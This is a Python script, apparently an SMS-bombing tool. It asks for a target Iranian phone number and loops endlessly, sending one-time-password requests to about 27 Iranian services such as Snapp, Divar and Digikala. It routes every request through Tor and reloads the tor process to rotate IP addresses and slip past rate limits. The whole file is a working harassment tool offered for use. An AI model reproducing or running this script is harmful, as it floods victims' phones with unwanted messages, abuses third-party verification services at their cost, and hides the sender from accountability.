#!/usr/bin/env python3

# Libraries
import os
import sys
import time
import requests
from threading import Thread


# Config
config = open("config.py", "r").read()
exec(config)





# Clear
os.system("cls" if os.name == "nt" else "clear")





# Snapp
def snapp(phone):
    global SnappHeader

    SnappData = {
        "cellphone":phone
        }

    try:
        SnapRequest = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=SnappHeader, json=SnappData, proxies=tor)
        if "OK" in SnapRequest.text:
            print(f"{green}True:  {white}Snapp{reset}")
        else:
            print(f"{red}False: {white}Snapp{reset}")
    except:
        print(f"{yellow}Can't send request")





# Gap
def gap(phone):
    global GapHeader

    try:
        GapRequest = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=GapHeader, proxies=tor)
        if "OK" in GapRequest.text:
            print(f"{green}True:  {white}Gap{reset}")
        else:
            print(f"{red}False: {white}Gap{reset}")
    except:
        print(f"{yellow}Can't send request")





# Tap30
def tap30(phone):
    global Tap30Header

    Tap30Data = {
        "credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}
        }

    try:
        Tap30Request = requests.post("https://tap33.me/api/v2/user", headers=Tap30Header, json=Tap30Data, proxies=tor)
        if "OK" in Tap30Request.text:
            print(f"{green}True:  {white}Tap30{reset}")
        else:
            print(f"{red}False: {white}Tap30{reset}")
    except:
        print(f"{yellow}Can't send request")





# Divar
def divar(phone):
    global DivarHeader
        
    DivarData = {
        "phone":phone.split("+98")[1]
        }

    try:
        DivarRequest = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=DivarHeader, json=DivarData, proxies=tor)
        if "SENT" in DivarRequest.text:
            print(f"{green}True:  {white}Divar{reset}")
        else:
            print(f"{red}False: {white}Divar{reset}")
    except:
        print(f"{yellow}Can't send request")





# Bama
def bama(phone):
    global BamaHeader

    BamaData = "cellNumber=0"+phone.split("+98")[1]

    try:
        BamaRequest = requests.post("https://bama.ir/signin-send-otp", headers=BamaHeader, data=BamaData, proxies=tor)
        if "0" in BamaRequest.text:
            print(f"{green}True:  {white}Bama{reset}")
        else:
            print(f"{red}False: {white}Bama{reset}")
    except:
        print(f"{yellow}Can't send request")





# Dedifood
def dedifood(phone):

    DedifoodURL = "https://customer.didofood.co/api/v1/CustomersRegistrations/send_activation_code"
    DedifoodData =  { 
        "mobile": phone.split("+98")[1],
        "country_id": 1
        }
    try:
        DedifoodRequest = requests.post(DedifoodURL ,json=DedifoodData, proxies=tor)
        if "200" in str(DedifoodRequest):
            print(f"{green}True:  {white}Dedifood{reset}")
        else:
            print(f"{red}False: {white}Dedifood{reset}")
    except:
        print(f"{yellow}Can't send request")





# Behtarino
def behtarino(phone):
    global BehtarinoHeader

    BehtarinoURL = "https://bck.behtarino.com/api/v1/users/phone_verification/"
    BehtarinoData =  { 
        "phone": "0" + phone.split("+98")[1]
        }
    try:
        BehtarinoRequest = requests.post(BehtarinoURL, headers=BehtarinoHeader, json=BehtarinoData, proxies=tor)
        if "200" in str(BehtarinoRequest):
            print(f"{green}True:  {white}Behtarino{reset}")
        else:
            print(f"{red}False: {white}Behtarino{reset}")
    except:
        print(f"{yellow}Can't send request")





# Delino
def delino(phone):

    DelinoURL = "https://www.delino.com/user/register"
    DelinoData =  { 
        "mobile": "0" + phone.split("+98")[1]
        }
    try:
        DelinoRequest = requests.post(DelinoURL, json=DelinoData, proxies=tor)
        if "200" in str(DelinoRequest):
            print(f"{green}True:  {white}Delino{reset}")
        else:
            print(f"{red}False: {white}Delino{reset}")
    except:
        print(f"{yellow}Can't send request")





# Zarinplus
def zarinplus(phone):
    global ZarinplusHeader

    ZarinplusURL = "https://api.zarinplus.com/user/zarinpal-login"
    ZarinplusData =  { 
        "phone_number": phone.split("+")[1]
        }
    try:
        ZarinplusRequest = requests.post(ZarinplusURL, headers=ZarinplusHeader, json=ZarinplusData, proxies=tor)
        if "200" in str(ZarinplusRequest):
            print(f"{green}True:  {white}Zarinplus{reset}")
        else:
            print(f"{red}False: {white}Zarinplus{reset}")
    except:
        print(f"{yellow}Can't send request")





# Livito
def livito(phone):
    global LivitoHeader

    LivitoURL = "https://livito.tv/api/oauth/initialize"
    LivitoData =  { 
        "username": "0" + phone.split("+98")[1],
        "scope": "*",
        "channel": "PASSWORD",
        "grant_type": "password"
        }
    try:
        LivitoRequest = requests.post(LivitoURL, headers=LivitoHeader, json=LivitoData, proxies=tor)
        if "200" in str(LivitoRequest):
            print(f"{green}True:  {white}Livito{reset}")
        else:
            print(f"{red}False: {white}Livito{reset}")
    except:
        print(f"{yellow}Can't send request")





# Baarbaanet
def baarbaanet(phone):
    global BaarbaanetHeader

    BaarbaanetURL = "https://baarbaanet.com/Barbanet/rest/pub/user/otp/send"
    BaarbaanetData =  { 
        "mobile": "0" + phone.split("+98")[1],
        "viaSms": True,
        "viaEmail": False
        }
    try:
        BaarbaanetRequest = requests.post(BaarbaanetURL, headers=BaarbaanetHeader, json=BaarbaanetData, proxies=tor)
        if "200" in str(BaarbaanetRequest):
            print(f"{green}True:  {white}Baarbaanet{reset}")
        else:
            print(f"{red}False: {white}Baarbaanet{reset}")
    except:
        print(f"{yellow}Can't send request")





# Bornos
def bornosmode(phone):
    global BornosHeader

    BornosURL = "https://bornosmode.com/api/loginRegister/"
    BornosData =  { 
        "mobile": "0" + phone.split("+98")[1],
        "withOtp": 1

        }
    try:
        BornosRequest = requests.post(BornosURL, headers=BornosHeader, json=BornosData, proxies=tor)
        if "200" in str(BornosRequest):
            print(f"{green}True:  {white}Bornos{reset}")
        else:
            print(f"{red}False: {white}Bornos{reset}")
    except:
        print(f"{yellow}Can't send request")





# Komodaa
def komodaa(phone):
    global KomodaHeader

    KomodaaURL = "https://api.komodaa.com/api/v2.6/loginRC/request"
    KomodaaData =  { 
        "phone_number": "0" + phone.split("+98")[1]
        }
    try:
        KomodaaRequest = requests.post(KomodaaURL, headers=KomodaHeader, json=KomodaaData, proxies=tor)
        if "200" in str(KomodaaRequest):
            print(f"{green}True:  {white}Komodaa{reset}")
        else:
            print(f"{red}False: {white}Komodaa{reset}")
    except:
        print(f"{yellow}Can't send request")





# DigiKala
def digikala(phone):
    global DigiKalaHeader

    DigiKalaURl = "https://api.digikala.com/v1/user/authenticate/"
    DigiKalaData = {
        "backUrl": "/",
        "username": "0" + phone.split("+98")[1],
        "otp_call": False
    }
    try:
        DigiKalaRequest = requests.post(DigiKalaURl, headers=DigiKalaHeader, json=DigiKalaData, proxies=tor)
        if "200" in str(DigiKalaRequest):
            print(f"{green}True:  {white}DigiKala{reset}")
        else:
            print(f"{red}False: {white}DigiKala{reset}")
    except:
        print(f"{yellow}Can't send request")





# Alibaba
def alibaba(phone):
    global AlibabaHeader

    AlibabaURL = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
    AlibabaData = {
        "phoneNumber": phone.split("+98")[1]
    }
    try:
        AlibabaRequest = requests.post(AlibabaURL, headers=AlibabaHeader, json=AlibabaData, proxies=tor)
        if "200" in str(AlibabaRequest):
            print(f"{green}True:  {white}Alibaba{reset}")
        else:
            print(f"{red}False: {white}Alibaba{reset}")
    except:
        print(f"{yellow}Can't send request")





# Sheypoor
def sheypoor(phone):
    global SheypoorHeader

    SheypoorURL = "https://www.sheypoor.com/api/v10.0.0/auth/send"
    SheypoorData = {
        "username": "0" + phone.split("+98")[1]
    }
    try:
        SheypoorRequest = requests.post(SheypoorURL, headers=SheypoorHeader, json=SheypoorData, proxies=tor)
        if "200" in str(SheypoorRequest):
            print(f"{green}True:  {white}Sheypoor{reset}")
        else:
            print(f"{red}False: {white}Sheypoor{reset}")
    except:
        print(f"{yellow}Can't send request")





# Esam
def esam(phone):
    global EsamHeader

    EsamURL = "https://api.esam.ir/api/account/RegisterOrLogin"
    EsamData = {
        "mobile": "0" + phone.split("+98")[1],
        "present_type": "WebApp",
        "registration_method": 0,
        "serialNumber": "React1234"
    }
    try:
        EsamRequest = requests.post(EsamURL, headers=EsamHeader, json=EsamData, proxies=tor)
        if "200" in str(EsamRequest):
            print(f"{green}True:  {white}Esam{reset}")
        else:
            print(f"{red}False: {white}Esam{reset}")
    except:
        print(f"{yellow}Can't send request")





# Namava
def namava(phone):
    global NamavaHeader

    NamavaURL = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
    NamavaData = {
        "UserName": phone
    }
    try:
        NamavaRequest = requests.post(NamavaURL, headers=NamavaHeader, json=NamavaData, proxies=tor)
        if "200" in str(NamavaRequest):
            print(f"{green}True:  {white}Namava{reset}")
        else:
            print(f"{red}False: {white}Namava{reset}")
    except:
        print(f"{yellow}Can't send request")





# MyMCI
def mymci(phone):
    global MyMCIHeader

    MyMCIURL = "https://api-ebcom.mci.ir/services/auth/v1.0/otp"
    MyMCIData = {
        "msisdn": phone.split("+98")[1]
    }
    try:
        MyMCIRequest = requests.post(MyMCIURL, headers=MyMCIHeader, json=MyMCIData, proxies=tor)
        if "200" in str(MyMCIRequest):
            print(f"{green}True:  {white}MyMCI{reset}")
        else:
            print(f"{red}False: {white}MyMCI{reset}")
    except:
        print(f"{yellow}Can't send request")





# tgju
def tgju(phone):
    global tgjuHeader

    tgjuURL = "https://dashboard-api.accessban.com/v1/auth/init"
    tgjuData = {
        "mobile": "0" + phone.split("+98")[1]
    }
    # Do not works with Header
    try:
        tgjuRequest = requests.post(tgjuURL, json=tgjuData, proxies=tor)
        if "200" in str(tgjuRequest):
            print(f"{green}True:  {white}TGUI{reset}")
        else:
            print(f"{red}False: {white}TGUI{reset}")
    except:
        print(f"{yellow}Can't send request")





# Torob
def torob(phone):
    global TorobHeader

    new_phone = "0" + phone.split("+98")[1]
    TorobURL = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={new_phone}"
    try:
        TorobRequest = requests.get(TorobURL, headers=TorobHeader, proxies=tor)
        if "200" in str(TorobRequest):
            print(f"{green}True:  {white}Torob{reset}")
        else:
            print(f"{red}False: {white}Torob{reset}")
    except:
        print(f"{yellow}Can't send request")





# TelWebion
def telwebion(phone):
    global TelWebionHeader

    TelWebionURL = "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one?isForeign=true"
    TelWebionData = {
        "phone": phone.split("+98")[1],
        "code": "98",
        "smsStatus": "default"
    }
    try:
        TelWebionRequest = requests.post(TelWebionURL, headers=TelWebionHeader, json=TelWebionData, proxies=tor)
        if "200" in str(TelWebionRequest):
            print(f"{green}True:  {white}TelWebion{reset}")
        else:
            print(f"{red}False: {white}TelWebion{reset}")
    except:
        print(f"{yellow}Can't send request")



#====================# New APIs #===================#


# Ponisha
def ponisha(phone):
    global PonishaHeader

    PonishaURL = "https://ponisha.ir/send-mobile-verfication" 
    PonishaData = {
        "mobile": phone,
        "type": "1"
    }
    try:
        PonishaRequest = requests.post(PonishaURL, headers=PonishaHeader, json=PonishaData, proxies=tor)
        if "200" in str(PonishaRequest):
            print(f"{green}True:  {white}Ponisha{reset}")
        else:
            print(f"{red}False: {white}Ponisha{reset}")
    except:
        print(f"{yellow}Can't send request")





# Salamcinama
def salamcinama(phone):
    global SalamcinamaHeader

    SalamcinamaURL = "https://api.salamcinama.ir/share/v3/registration/mobile.json" 
    SalamcinamaData = {
        "mobile_number": "0" + phone.split("+98")[1],
        "name": "randomfake names",
        "signup_from": "vote"
    }
    try:
        SalamcinamaRequest = requests.post(SalamcinamaURL, headers=SalamcinamaHeader, json=SalamcinamaData, proxies=tor)
        if "200" in str(SalamcinamaRequest):
            print(f"{green}True:  {white}Salamcinama{reset}")
        else:
            print(f"{red}False: {white}Salamcinama{reset}")
    except:
        print(f"{yellow}Can't send request")





# Karnaval
def karnaval(phone):
    global KarnavalHeader

    KarnavalURL = "https://api.karnaval.ir/graphql" 
    KarnavalData = {
        "queryId":"0edebe0df353cee7f11614a37087371f",
        "variables":{
            "phone": "0" + phone.split("+98")[1],
            "isSecondAttempt": False
        }
    }
    try:
        KarnavalRequest = requests.post(KarnavalURL, headers=KarnavalHeader, json=KarnavalData, proxies=tor)
        if "200" in str(KarnavalRequest):
            print(f"{green}True:  {white}Karnaval{reset}")
        else:
            print(f"{red}False: {white}Karnaval{reset}")
    except:
        print(f"{yellow}Can't send request")





# Kanape
def kanape(phone):
    global KanapeHeader
    
    KanapeURL = "https://api.kanape.ir/v4/auth/register"
    KanapeData = {
        "mobile": "0" + phone.split("+98")[1]
    }
    try:
        KanapeRequest = requests.post(KanapeURL, headers=KanapeHeader, json=KanapeData, proxies=tor)
        if "200" in str(KanapeRequest):
            print(f"{green}True:  {white}Kanape{reset}")
        else:
            print(f"{red}False: {white}Kanape{reset}")
    except:
        print(f"{yellow}Can't send request")


# Main
def main():
    global logo

    print(logo)

    text = f"{blue}Enter target {white}(+98xxxxxxxxxx){blue} : {reset}" 
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.05)

    phone = input()

    if len(phone) == 13:    
        hint = (f"{blue}Spam Started!{reset}\n{blue}Hit {white}ctrl + z{blue} to {white}exit{reset}!\n")
        for char in hint:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.0)

        while True:

            IP = requests.get("http://httpbin.org/ip", proxies=tor).json()['origin']
            print(f"\n{blue}Connected to {white}{IP}{blue} With tor!{reset}\n")


            Thread(target=ponisha, args=[phone]).start()       # Ponisha
            time.sleep(0.5)

            Thread(target=salamcinama, args=[phone]).start()   # Salamcinama
            time.sleep(0.5)
        
            Thread(target=karnaval, args=[phone]).start()      # Karnaval
            time.sleep(0.5)

            Thread(target=kanape, args=[phone]).start()        # Kanape
            time.sleep(0.5)

            Thread(target=snapp, args=[phone]).start()         # Snapp
            time.sleep(0.5)

            os.system("kill -HUP $(pidof tor)")

            Thread(target=gap, args=[phone]).start()           # Gap
            time.sleep(0.5)

            Thread(target=tap30, args=[phone]).start()         # Tap30
            time.sleep(0.5)

            Thread(target=divar, args=[phone]).start()         # Divar
            time.sleep(0.5)

            Thread(target=bama, args=[phone]).start()          # Bama
            time.sleep(0.5)

            Thread(target=dedifood, args=[phone]).start()      # Dedifood
            time.sleep(0.5)

            os.system("kill -HUP $(pidof tor)")

            Thread(target=behtarino, args=[phone]).start()     # Behtarino
            time.sleep(0.5)

            Thread(target=delino, args=[phone]).start()        # Delino
            time.sleep(0.5)

            Thread(target=zarinplus, args=[phone]).start()     # Zarinplus
            time.sleep(0.5)

            Thread(target=livito, args=[phone]).start()        # Livito
            time.sleep(0.5)

            Thread(target=baarbaanet, args=[phone]).start()    # Baarbaanet
            time.sleep(0.5)

            os.system("kill -HUP $(pidof tor)")

            Thread(target=bornosmode, args=[phone]).start()    # Bornos
            time.sleep(0.5)

            Thread(target=komodaa, args=[phone]).start()       # Komodaa
            time.sleep(0.5)
 
            Thread(target=digikala, args=[phone]).start()      # DigiKala
            time.sleep(0.5)

            Thread(target=alibaba, args=[phone]).start()       # Alibaba
            time.sleep(0.5)

            Thread(target=sheypoor, args=[phone]).start()      # Sheypoor
            time.sleep(0.5)

            os.system("kill -HUP $(pidof tor)")

            Thread(target=esam, args=[phone]).start()          # Esam
            time.sleep(0.5)

            Thread(target=namava, args=[phone]).start()        # Namava
            time.sleep(0.5)

            Thread(target=mymci, args=[phone]).start()         # MyMCI
            time.sleep(0.5)
 
            Thread(target=tgju, args=[phone]).start()          # tgju
            time.sleep(0.5)

            Thread(target=torob, args=[phone]).start()         # Torob
            time.sleep(0.5)
        
            Thread(target=telwebion, args=[phone]).start()     # TelWebion
            time.sleep(0.5)
 
            os.system("kill -HUP $(pidof tor)")



    else:
        error = f"{white}Error: {red}Invalid number entered!"
        for char in error:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.05)       




if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        back = f"\n{blue}Exiting by user request {white}...{reset}"
        for char in back:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.05)
        sys.exit()

# SlavPH
